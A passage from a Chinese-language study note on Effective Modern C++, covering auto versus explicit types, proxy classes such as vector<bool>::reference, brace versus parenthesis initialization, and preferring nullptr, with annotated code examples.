v.size();<br></code></pre></div></td></tr></table></figure><p><code>v.size()</code>的标准返回类型是<code>std::vector&lt;int&gt;::size_type</code>，但是只有少数开发者意识到这点。<code>std::vector&lt;int&gt;::size_type</code>实际上被指定为无符号整型。上述的代码，会造成一些有趣的结果。</p><p>举个例子，在Windows32-bit上<code>std::vector&lt;int&gt;::size_type</code>和<code>unsigned</code>是一样的大小，但是在Windows64-bit上<code>std::vector&lt;int&gt;::size_type</code>是64位，<code>unsigned</code>是32位。这意味着这段代码在Windows32-bit上正常工作，但是当把应用程序移植到Windows64-bit上时就可能会出现一些问题。</p><p>所以使用<code>auto</code>可以确保你不需要浪费时间：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> sz =v.size();                      <span class="hljs-comment">//sz的类型是std::vector&lt;int&gt;::size_type</span><br></code></pre></div></td></tr></table></figure><p>考虑下面的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unordered_map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-keyword">int</span>&gt; m;<br>…<br><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::pair&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-keyword">int</span>&gt;&amp; p : m)<br>&#123;<br>    …                                   <span class="hljs-comment">//用p做一些事</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>看起来好像很合情合理的表达，但是这里有一个问题：</p><p><code>std::unordered_map</code>的<em>key</em>是<code>const</code>的，所以<em>hashtable</em>中的<code>std::pair</code>的类型不是<code>std::pair&lt;std::string, int&gt;</code>，而是<code>std::pair&lt;const std::string, int&gt;</code>。</p><p>编译器会努力的找到一种方法把<code>std::pair&lt;const std::string, int&gt;</code>（即<em>hashtable</em>中的东西）转换为<code>std::pair&lt;std::string, int&gt;</code>（<code>p</code>的声明类型）。它会成功的，因为它会通过拷贝<code>m</code>中的对象创建一个临时对象，是<code>m</code>中元素的类型。然后把<code>p</code>的引用绑定到这个临时对象上。在每个循环迭代结束时，临时对象将会销毁。</p><p>所以不只是让<code>p</code>指向<code>m</code>中各个元素的引用而已。</p><p>使用<code>auto</code>可以避免这些很难被意识到的类型不匹配的错误：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span>&amp; p : m) &#123;<br>    …                                   <span class="hljs-comment">//如之前一样</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>这样无疑更具效率，且更容易书写。而且，这个代码有一个非常吸引人的特性，如果你获取<code>p</code>的地址，你确实会得到一个指向<code>m</code>中元素的指针。在没有<code>auto</code>的版本中<code>p</code>会指向一个临时变量，这个临时变量在每次迭代完成时会被销毁。</p><p>讲究！</p><p>有时候，显式的指定类型可能会导致你不想看到的类型转换。如果你使用<code>auto</code>声明目标变量你就不必担心这个问题。</p><p>然而<code>auto</code>也不是完美的。每个<code>auto</code>变量都从初始化表达式中推导类型，有一些表达式的类型和我们期望的大相径庭，比如在<code>理解auto类型推导</code> 小结的内容。</p><p>另外，一个适当的变量名称就能体现大量的抽象类型信息，所以不用考虑 auto带来的信息不可见性。</p><h3><span id="结论">结论</span></h3><ul><li><code>auto</code>变量必须初始化，通常它可以避免一些移植性和效率性的问题，也使得重构更方便，还能让你少打几个字。</li><li>注意 <code>auto</code> 可能出现一些类型推导不一致的问题。</li></ul><h2><span id="6-auto遇上代理类型使用显式类型初始化">6 <code>auto</code>遇上代理类型，使用显式类型初始化</span></h2><p>假如我有一个函数，参数为<code>Widget</code>，返回一个<code>std::vector&lt;bool&gt;</code>，这里的<code>bool</code>表示<code>Widget</code>是否提供一个独有的特性。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">bool</span>&gt; <span class="hljs-title">features</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Widget&amp; w)</span></span>;<br></code></pre></div></td></tr></table></figure><p>更进一步假设第5个<em>bit</em>表示<code>Widget</code>是否具有高优先级，我们可以写这样的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w;<br>…<br><span class="hljs-keyword">bool</span> highPriority = features(w)[<span class="hljs-number">5</span>];     <span class="hljs-comment">//w高优先级吗？</span><br>…<br>processWidget(w, highPriority);         <span class="hljs-comment">//根据它的优先级处理w</span><br></code></pre></div></td></tr></table></figure><p>这个代码没有任何问题。它会正常工作，但是如果我们使用<code>auto</code>代替<code>highPriority</code>的显式指定类型做一些看起来很无害的改变：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> highPriority = features(w)[<span class="hljs-number">5</span>];     <span class="hljs-comment">//w高优先级吗？</span><br></code></pre></div></td></tr></table></figure><p>情况变了。所有代码仍然可编译，但是行为不再可预测：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">processWidget(w,highPriority);          <span class="hljs-comment">//未定义行为！</span><br></code></pre></div></td></tr></table></figure><p>因为 features(w)[5] 调用<code>operator[]</code>不会返回容器中元素的引用，取而代之它返回一个<code>std::vector&lt;bool&gt;::reference</code>的对象。</p><p>调用<code>features</code>将返回一个<code>std::vector&lt;bool&gt;</code>临时对象，这个对象没有名字，为了方便我们的讨论，我这里叫他<code>temp</code>。<code>operator[]</code>在<code>temp</code>上调用，它返回的<code>std::vector&lt;bool&gt;::reference</code>包含一个指向存着这些<em>bits</em>的指针（<code>temp</code>管理这些<em>bits</em>）。<code>highPriority</code>是这个<code>std::vector&lt;bool&gt;::reference</code>的拷贝，所以<code>highPriority</code>也包含一个指针，指向<code>temp</code>中的管理bits。在这个语句结束的时候<code>temp</code>将会被销毁，因为它是一个临时变量。因此<code>highPriority</code>包含一个悬挂（<em>dangling</em>）指针，如果用于<code>processWidget</code>调用中将会造成未定义行为：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">processWidget(w, highPriority);         <span class="hljs-comment">//未定义行为！</span><br>                                        <span class="hljs-comment">//highPriority包含一个悬置指针！</span><br></code></pre></div></td></tr></table></figure><h3><span id="代理类问题">代理类问题</span></h3><p><code>std::vector&lt;bool&gt;::reference</code>是一个代理类（<em>proxyclass</em>）的例子：所谓代理类就是以模仿和增强一些类型的行为为目的而存在的类。</p><p>C++标准模板库中的智能指针也是用代理类实现了对原始指针的资源管理行为。</p><p>一些代理类被设计于用以对客户可见。比如<code>std::shared_ptr</code>和<code>std::unique_ptr</code>。其他的代理类则或多或少不可见，比如<code>std::vector&lt;bool&gt;::reference</code>就是不可见代理类的一个例子，还有<code>std::bitset::reference</code>等。</p><p>一些C++库也是用了表达式模板（<em>expressiontemplates</em>）的黑科技。这些库通常被用于提高数值运算的效率。给出一个矩阵类<code>Matrix</code>和矩阵对象<code>m1</code>，<code>m2</code>，<code>m3</code>，<code>m4</code>，举个例子，这个表达式</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Matrix sum = m1 + m2 + m3 + m4;<br></code></pre></div></td></tr></table></figure><p>可以使计算更加高效，只需要使让<code>operator+</code>返回一个代理类代理结果<code>Sum&lt;Matrix, Matrix&gt;</code> 而不是返回结果本身。</p><p>作为一个通则，不可见的代理类通常不适用于<code>auto</code>。这样类型的对象的生命期通常不会活过一条语句，所以创建那样的对象是危险的。</p><h3><span id="显式类型初始化器theexplicitly-typed-initialized-idiom">显式类型初始化器（<em>theexplicitly typed initialized idiom</em>)</span></h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> highPriority = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">bool</span>&gt;(features(w)[<span class="hljs-number">5</span>]);<br></code></pre></div></td></tr></table></figure><p>这里，<code>features(w)[5]</code>还是返回一个<code>std::vector&lt;bool&gt;::reference</code>对象，但是这个转型使得表达式类型为<code>bool</code>，然后<code>auto</code>才被用于推导<code>highPriority</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> sum = <span class="hljs-keyword">static_cast</span>&lt;Matrix&gt;(m1 + m2 + m3 + m4);<br><span class="hljs-keyword">auto</span> ep = <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">float</span>&gt;(calcEpsilon());  <span class="hljs-comment">// 转换精度</span><br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>不可见的代理类可能会使<code>auto</code>从表达式中推导出“错误的”类型</li><li>显式类型初始化器强制<code>auto</code>推导出你想要的结果</li></ul><h2><span id="7区分和创建对象">7区分<code>()</code>和<code>{}</code>创建对象</span></h2><p>C++11使用统一初始化（<em>uniform initialization</em>）</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; v&#123; <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span> &#125;;  <span class="hljs-comment">//v初始内容为1,3,5</span><br></code></pre></div></td></tr></table></figure><p>C++11允许"="初始化不加花括号也拥有这种能力，括号初始化也能被用于为非静态数据成员指定默认初始值：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span>&#123;</span><br>    …<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-keyword">int</span> x&#123; <span class="hljs-number">0</span> &#125;;                 <span class="hljs-comment">//没问题，x初始值为0</span><br>    <span class="hljs-keyword">int</span> y = <span class="hljs-number">0</span>;                  <span class="hljs-comment">//也可以</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">z</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;                   <span class="hljs-comment">//错误！</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>另一方面，不可拷贝的对象（例如<code>std::atomic</code>）可以使用花括号初始化或者圆括号初始化，但是不能使用"="初始化：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">int</span>&gt; ai1&#123; <span class="hljs-number">0</span> &#125;;      <span class="hljs-comment">//没问题</span><br><span class="hljs-function"><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">ai2</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;        <span class="hljs-comment">//没问题</span><br><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">int</span>&gt; ai3 = <span class="hljs-number">0</span>;       <span class="hljs-comment">//错误！</span><br></code></pre></div></td></tr></table></figure><h3><span id="内置类型间的隐式变窄转换narrowing-conversion">内置类型间的隐式变窄转换(narrowing conversion)</span></h3><p>括号表达式还有一个少见的特性，即它不允许内置类型间隐式的变窄转换（<em>narrowingconversion</em>）。如果一个使用了括号初始化的表达式的值，不能保证由被初始化的对象的类型来表示，代码就不会通过编译：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">double</span> x, y, z;<br><br><span class="hljs-keyword">int</span> sum1&#123; x + y + z &#125;;          <span class="hljs-comment">//错误！double的和可能不能表示为int</span><br></code></pre></div></td></tr></table></figure><p>使用圆括号和"="的初始化不检查是否转换为变窄转换，因为由于历史遗留问题它们必须要兼容老旧代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sum2</span><span class="hljs-params">(x + y +z)</span></span>;             <span class="hljs-comment">//可以（表达式的值被截为int）</span><br><br><span class="hljs-keyword">int</span> sum3 = x + y + z;           <span class="hljs-comment">//同上</span><br></code></pre></div></td></tr></table></figure><h3><span id="被误认为是声明">被误认为是声明</span></h3><p>C++规定任何<em>可以被解析</em>为一个声明的东西<em>必须被解析</em>为声明。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget <span class="hljs-title">w1</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>;                  <span class="hljs-comment">//使用实参10调用Widget的一个构造函数</span><br></code></pre></div></td></tr></table></figure><p>但是如果你尝试使用相似的语法调用<code>Widget</code>无参构造函数，它就会变成函数声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget <span class="hljs-title">w2</span><span class="hljs-params">()</span></span>;                    <span class="hljs-comment">//最令人头疼的解析！声明一个函数w2，返回Widget</span><br></code></pre></div></td></tr></table></figure><p>由于函数声明中形参列表不能带花括号，所以使用花括号初始化表明你想调用默认构造函数构造对象就没有问题：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w3&#123;&#125;;                    <span class="hljs-comment">//调用没有参数的构造函数构造对象</span><br></code></pre></div></td></tr></table></figure><h3><span id="initializer_list关联问题">initializer_list关联问题</span></h3><p>在构造函数调用中，只要不包含<code>std::initializer_list</code>形参，那么花括号初始化和圆括号初始化都会产生一样的结果：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span> <br><span class="hljs-keyword">public</span>:  <br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">bool</span> b);      <span class="hljs-comment">//构造函数未声明</span><br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">double</span> d);    <span class="hljs-comment">//std::initializer_list这个形参 </span><br>    …<br>&#125;;<br><span class="hljs-function">Widget <span class="hljs-title">w1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>)</span></span>;            <span class="hljs-comment">//调用第一个构造函数</span><br>Widget w2&#123;<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>&#125;;            <span class="hljs-comment">//也调用第一个构造函数</span><br><span class="hljs-function">Widget <span class="hljs-title">w3</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>)</span></span>;             <span class="hljs-comment">//调用第二个构造函数</span><br>Widget w4&#123;<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>&#125;;             <span class="hljs-comment">//也调用第二个构造函数</span><br></code></pre></div></td></tr></table></figure><p>然而，如果有一个或者多个构造函数的声明包含一个<code>std::initializer_list</code>形参，那么使用括号初始化语法的调用更倾向于选择带<code>std::initializer_list</code>的那个构造函数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span> <br><span class="hljs-keyword">public</span>:  <br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">bool</span> b);      <span class="hljs-comment">//同上</span><br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">double</span> d);    <span class="hljs-comment">//同上</span><br>    Widget(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">initializer_list</span>&lt;<span class="hljs-keyword">long</span> <span class="hljs-keyword">double</span>&gt; il);      <span class="hljs-comment">//新添加的</span><br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>w2</code>和<code>w4</code>将会使用新添加的构造函数，即使另一个非<code>std::initializer_list</code>构造函数和实参更匹配：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget <span class="hljs-title">w1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>)</span></span>;    <span class="hljs-comment">//使用圆括号初始化，同之前一样</span><br>                        <span class="hljs-comment">//调用第一个构造函数</span><br><br>Widget w2&#123;<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>&#125;;    <span class="hljs-comment">//使用花括号初始化，但是现在</span><br>                        <span class="hljs-comment">//调用带std::initializer_list的构造函数</span><br>                        <span class="hljs-comment">//(10 和 true 转化为long double)</span><br><br><span class="hljs-function">Widget <span class="hljs-title">w3</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>)</span></span>;     <span class="hljs-comment">//使用圆括号初始化，同之前一样</span><br>                        <span class="hljs-comment">//调用第二个构造函数 </span><br><br>Widget w4&#123;<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>&#125;;     <span class="hljs-comment">//使用花括号初始化，但是现在</span><br>                        <span class="hljs-comment">//调用带std::initializer_list的构造函数</span><br>                        <span class="hljs-comment">//(10 和 5.0 转化为long double)</span><br></code></pre></div></td></tr></table></figure><p>编译器一遇到括号初始化就选择带<code>std::initializer_list</code>的构造函数的决心是如此强烈，以至于就算带<code>std::initializer_list</code>的构造函数不能被调用，它也会硬选。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span> <br><span class="hljs-keyword">public</span>: <br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">bool</span> b);                      <span class="hljs-comment">//同之前一样</span><br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">double</span> d);                    <span class="hljs-comment">//同之前一样</span><br>    Widget(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">initializer_list</span>&lt;<span class="hljs-keyword">bool</span>&gt; il);     <span class="hljs-comment">//现在元素类型为bool</span><br>    …                                           <span class="hljs-comment">//没有隐式转换函数</span><br>&#125;;<br><br>Widget w&#123;<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>&#125;;              <span class="hljs-comment">//错误！要求变窄转换</span><br></code></pre></div></td></tr></table></figure><p>这里，编译器会直接忽略前面两个构造函数（其中第二个构造函数是所有实参类型的最佳匹配），然后尝试调用<code>std::initializer_list&lt;bool&gt;</code>构造函数。调用这个函数将会把<code>int(10)</code>和<code>double(5.0)</code>转换为<code>bool</code>，由于会产生变窄转换（<code>bool</code>不能准确表示其中任何一个值），括号初始化拒绝变窄转换，所以这个调用无效，代码无法通过编译。</p><p>只有当没办法把括号初始化中实参的类型转化为<code>std::initializer_list</code>时，编译器才会回到正常的函数决议流程中。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span> <br><span class="hljs-keyword">public</span>:  <br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">bool</span> b);                              <span class="hljs-comment">//同之前一样</span><br>    Widget(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">double</span> d);                            <span class="hljs-comment">//同之前一样</span><br>    <span class="hljs-comment">//现在std::initializer_list元素类型为std::string</span><br>    Widget(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">initializer_list</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; il);<br>    …                                                   <span class="hljs-comment">//没有隐式转换函数</span><br>&#125;;<br><br><span class="hljs-function">Widget <span class="hljs-title">w1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>)</span></span>;     <span class="hljs-comment">// 使用圆括号初始化，调用第一个构造函数</span><br>Widget w2&#123;<span class="hljs-number">10</span>, <span class="hljs-literal">true</span>&#125;;     <span class="hljs-comment">// 使用花括号初始化，现在调用第一个构造函数</span><br><span class="hljs-function">Widget <span class="hljs-title">w3</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>)</span></span>;      <span class="hljs-comment">// 使用圆括号初始化，调用第二个构造函数</span><br>Widget w4&#123;<span class="hljs-number">10</span>, <span class="hljs-number">5.0</span>&#125;;      <span class="hljs-comment">// 使用花括号初始化，现在调用第二个构造函数</span><br></code></pre></div></td></tr></table></figure><p>空的花括号意味着没有实参，不是一个空的<code>std::initializer_list</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span> <br><span class="hljs-keyword">public</span>:  <br>    Widget();                                   <span class="hljs-comment">//默认构造函数</span><br>    Widget(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">initializer_list</span>&lt;<span class="hljs-keyword">int</span>&gt; il);      <span class="hljs-comment">//std::initializer_list构造函数</span><br><br>    …                                           <span class="hljs-comment">//没有隐式转换函数</span><br>&#125;;<br><br>Widget w1;                      <span class="hljs-comment">//调用默认构造函数</span><br>Widget w2&#123;&#125;;                    <span class="hljs-comment">//也调用默认构造函数</span><br><span class="hljs-function">Widget <span class="hljs-title">w3</span><span class="hljs-params">()</span></span>;                    <span class="hljs-comment">//最令人头疼的解析！声明一个函数</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">Widget <span class="hljs-title">w4</span><span class="hljs-params">(&#123;&#125;)</span></span>;                  <span class="hljs-comment">//使用空花括号列表调用std::initializer_list构造函数</span><br>Widget w5&#123;&#123;&#125;&#125;;                  <span class="hljs-comment">//同上</span><br></code></pre></div></td></tr></table></figure><p>作为一个类库使用者，你必须认真的在花括号和圆括号之间选择一个来创建对象。大多数开发者都使用其中一种作为默认情况，只有当他们不能使用这种的时候才会考虑另一种。</p><h3><span id="结论">结论</span></h3><ul><li>花括号初始化是最广泛使用的初始化语法，它防止变窄转换，并且对于C++最令人头疼的解析（括号解析为函数）有天生的免疫性</li><li>在构造函数重载决议中，编译器会尽最大努力将括号初始化与<code>std::initializer_list</code>参数匹配，即便其他构造函数看起来是更好的选择</li><li>对于数值类型的<code>std::vector</code>来说使用花括号初始化和圆括号初始化会造成巨大的不同</li><li>在模板类选择使用圆括号初始化或使用花括号初始化创建对象是需要仔细考虑</li></ul><h2><span id="8-优先-nullptr">8 优先 <code>nullptr</code></span></h2><p>在C++98中，对指针类型和整型进行重载意味着可能导致奇怪的事情。如果给下面的重载函数传递<code>0</code>或<code>NULL</code>，它们绝不会调用指针版本的重载函数：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;        <span class="hljs-comment">//三个f的重载函数</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">bool</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><br>f(<span class="hljs-number">0</span>);               <span class="hljs-comment">//调用f(int)而不是f(void*)</span><br><br>f(<span class="hljs-literal">NULL</span>);            <span class="hljs-comment">//可能不会被编译，一般来说调用f(int)，</span><br>                    <span class="hljs-comment">//绝对不会调用f(void*)</span><br></code></pre></div></td></tr></table></figure><p>而<code>f(NULL)</code>的不确定行为是由<code>NULL</code>的实现不同造成的。如果<code>NULL</code>被定义为<code>0L</code>（指的是<code>0</code>为<code>long</code>类型），这个调用就具有二义性，因为从<code>long</code>到<code>int</code>的转换或从<code>long</code>到<code>bool</code>的转换或<code>0L</code>到<code>void*</code>的转换都同样好。</p><p><code>nullptr</code>的优点是它不是整型。它也不是一个指针类型，但是你可以把它认为是<strong>所有</strong>类型的指针。<code>nullptr</code>的真正类型是<code>std::nullptr_t</code>，在一个完美的循环定义以后，<code>std::nullptr_t</code>又被定义为<code>nullptr</code>。<code>std::nullptr_t</code>可以隐式转换为指向任何内置类型的指针。</p><p>使用<code>nullptr</code>调用<code>f</code>将会调用<code>void*</code>版本的重载函数，因为<code>nullptr</code>不能被视作任何整型：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">f(<span class="hljs-literal">nullptr</span>);         <span class="hljs-comment">//调用重载函数f的f(void*)版本</span><br></code></pre></div></td></tr></table></figure><p>看下面的例子：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div 